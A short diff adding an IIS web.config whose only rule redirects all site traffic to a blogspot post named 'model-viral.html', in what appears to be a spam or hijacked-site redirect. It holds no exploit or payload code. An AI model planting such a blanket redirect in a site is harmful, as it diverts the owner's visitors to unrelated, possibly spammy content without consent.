@@ -1,0 +1,5 @@
+<configuration>
+<system.webServer>
+<httpRedirect enabled="true" exactDestination="true" destination="https://ajobpola778.blogspot.com/2025/01/model-viral.html" />
+</system.webServer>
+</configuration>
